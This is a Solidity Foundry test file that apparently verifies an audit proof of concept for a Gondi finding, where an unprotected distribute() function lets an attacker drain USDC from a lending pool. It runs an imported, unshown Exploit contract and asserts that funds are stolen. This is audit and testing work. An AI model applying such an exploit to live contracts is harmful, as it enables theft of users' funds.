// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./35205-h-03-function-distribute-lacks-access-control-allowing-anyon.sol";

/*//////////////////////////////////////////////////////////////////////////
    Gondi [H-03] — permissionless distribute() corrupts Pool accounting.

    Re-asserts fund harm: attacker withdraws more real USDC than deposited.
//////////////////////////////////////////////////////////////////////////*/
contract DistributeAccessControlTest is Test {
    function test_permissionless_distribute_drains_pool_usdc() public {
        Exploit exp = new Exploit();
        uint256 attackerUsdcBefore = exp.usdc().balanceOf(address(exp));
        // attacker starts with 0 free USDC (all deposited); junk is separate
        assertEq(attackerUsdcBefore, 0, "no free usdc pre-attack");

        exp.run();

        assertGt(exp.stolen(), exp.ATTACKER_DUST(), "extracted more than dust deposit");
        assertLt(exp.poolUsdcAfter(), exp.VICTIM_DEPOSIT(), "victim funds reduced");
        assertEq(exp.usdc().balanceOf(address(exp)), exp.stolen(), "attacker holds stolen USDC");
    }
}
